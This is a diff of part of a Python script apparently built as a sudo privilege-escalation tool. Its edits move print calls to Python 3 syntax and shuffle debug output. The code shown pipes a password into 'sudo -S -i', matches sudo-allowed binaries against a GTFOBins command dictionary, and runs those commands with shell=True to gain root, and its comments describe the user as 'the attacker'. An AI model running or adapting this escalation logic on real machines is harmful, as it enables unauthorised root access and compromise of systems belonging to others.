@@ -174,7 +174,7 @@ def sudoprivescalation () :
         if checkSudo_i (password) : 
             return  sub.Popen('echo "{passwd}" | sudo -S -i'.format(passwd=passwd),shell =True).wait() 
         else : 
-            print "Sudo -i not working "
+            print ("Sudo -i not working ")
 
 
     if (userPass and sudoPass) :
@@ -232,7 +232,6 @@ def sudoprivescalation () :
     # if the attacker has no password but can execute sudo  -l 
     #Cas 2.3 
     if (not userPass and not sudoPass) : 
-
         binaries  = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudo()))
         print (binaries)
         for binary in binaries : 
@@ -244,10 +243,10 @@ def sudoprivescalation () :
             except : 
                 return "Something went wrong while executing command : "+ gtfobinsDict1[binary]
 
-  
+ 
     if ifdefault (password, sudoPass) :
+        print ('case 4')
         for key in gtfobinsDict1.keys():
-            print (key)
             try : 
                 if checkIFSudoRootWithPass(gtfobinsDict1[key], password) : 
                     return sub.Popen(gtfobinsDict1[key],shell =True).wait() 
@@ -255,7 +254,6 @@ def sudoprivescalation () :
                     print ("seems like you can't run as root with "+cmd)
             except : 
                     print ("Somthing went wrong while executing "+cmd)
-
-
+    
 
 sudoprivescalation ()
